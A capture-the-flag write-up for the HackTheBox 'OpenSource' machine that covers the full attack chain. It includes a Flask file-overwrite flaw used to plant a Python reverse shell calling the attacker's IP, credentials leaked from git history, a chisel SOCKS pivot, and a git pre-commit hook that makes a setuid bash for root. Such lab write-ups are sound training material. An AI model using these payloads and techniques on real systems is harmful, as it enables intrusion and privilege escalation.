---
title: "Open Source HackTheBox Writeup"
author: "0xMesbaha"
cover: "/media/open-source/20220522230256.png"
tags: ["Hackthebox", "git", "docker", "port-forwarding"]
categories:
  - Linux Machines
date: 2022-10-08T00:45:19+02:00
draft: false
---

In This Box we are facing interesting Stuff like Docker , git hooks and other stuff. first we got access to a docker in the machine by overwritting the application code with a reverse shell. then we make port forwarding to scan the original host which has a Service running and we can see it from the docker. From this Service we can get access to the actual machine and from their we can get the root access using git hooks because the root seems to have a cronjob running git

<!--more-->

# Scanning

```bash
nmap -A -T5 10.129.168.8 -oN intial.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sun, 22 May 2022 18:39:53 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sun, 22 May 2022 18:39:53 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!

```

# Enumeration

- we are introduced with this page which doesn't contain much information or user inputs

![error](/media/open-source/20220522204304.png)

- viewing the page source will see there are 2 endpoints :

```bash
/download
/upcloud
```

- at `/download` we can download a file `source.zip` which contains some source codes related to the web page we are into now.

There is `Dockerfile` which reveals the web page we have seen is built from a docker container , so if we get a remote code execution from this application we will be in the container itself

![error](/media/open-source/20220522204711.png)

It reveals also the application current working directory which is under `/app` , we know also it uses Flask

**views.py**

we can see from this code it has upload function which we find under `/upcloud`, and it will add the file to the path `os.getcwd()/public/uploads/`

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

we can also see`get_file_name(f.filename)` function which takes the file name we sent as argument and filter the `../` from it as we see here

![error](/media/open-source/20220522210114.png)

Looking at the `views.py` and testing the logic of saving files , we can see we are able to place the file we upload in any location we want

![error](/media/open-source/20220522210721.png)

now we can try to upload file with the name `/app/app/templates/test.html` and check if we can write this file as we understood. However it didn't work :(

Trying to name the file with an exist filename like `/app/app/templates/index.html`

![error](/media/open-source/20220522211127.png)

and we can overwrite an existed file indeed !

![error](/media/open-source/20220522211005.png)

With that working we can overwrite the **`views.py`** which controls what to render in the application , we can choose to get us a reverse shell or a remote code execution.

adding this route to the `views.py` so when we request the `/exec` a reverse connection will get back to us

```python
@app.route('/exec')
def evil():
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.31",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
    return ""
```

![error](/media/open-source/20220522211601.png)

requesting the page `/exec` a connection get back to us

![error](/media/open-source/20220522212349.png)

and as expected we can see we are in a docker :

![error](/media/open-source/20220522212442.png)

# User access

getting back to the source code we can find the **`.git`** , we can check the commits with

```bash
git log --all
```

![error](/media/open-source/20220522214021.png)

checking all , we can find this useful one here :

```bash
git show be4da71987bbbc8fae7c961fb2de01ebd0be1997
```

![error](/media/open-source/20220522214205.png)

```cmd
# seems like a credintials
dev01:Soulless_Developer#2022
```

If we try to ssh with that user and we can't login with that password

```bash
dev01@10.129.168.8: Permission denied (publickey).
```

maybe we keep the password for latter usage and move on

From the docker we have we want to get the ip of the host in the docker network , we can check the arp :

![error](/media/open-source/20220522222022.png)

knowing that we can set a chisel as socks proxy server to scan the host in the docker network

```bash
# @ my side
./chisel_1.7.7_linux_amd64  server -p 8000 --reverse
# @ target
./chisel_1.7.7_linux_amd64 client 10.10.16.31:8000 R:1080:socks
```

and edit the `/etc/proxychains.conf` to have `socks5  127.0.0.1 1080` and in foxy proxy set the proxy to sock5 and port 1080

scanning the host we can see port `3000` is open , we can visit it at our browser

![error](/media/open-source/20220522222635.png)

we can use the credentials we have found earlier to login and it works

![error](/media/open-source/20220522222821.png)

![error](/media/open-source/20220522224019.png)

with this ssh key we can login with user `dev01`

![error](/media/open-source/20220522230112.png)

# Root access

After running `pspy` on the target will find the following :

![error](/media/open-source/20220522230941.png)

it seems with the root uid , it creates backup for the home of user dev01 , we can visit the path

![error](/media/open-source/20220522231056.png)

searching on how can we execute script with this information will find [this](https://support.gitkraken.com/working-with-repositories/githooksexample/#:~:text=Open%20a%20terminal%20window%20by,the%20pre%2Dcommit%20file%20executable.) talks about hooks.

```bash
dev01@opensource:~/.git/hooks$ echo "cp /bin/bash /tmp/bash ; chmod +s /tmp/bash" >> pre-commit.sample
dev01@opensource:~/.git/hooks$ mv pre-commit.sample pre-commit
```

now wait until the bash is here

```bash
cd /tmp ; watch ls
```

![error](/media/open-source/20220522231511.png)

![error](/media/open-source/20220522231541.png)
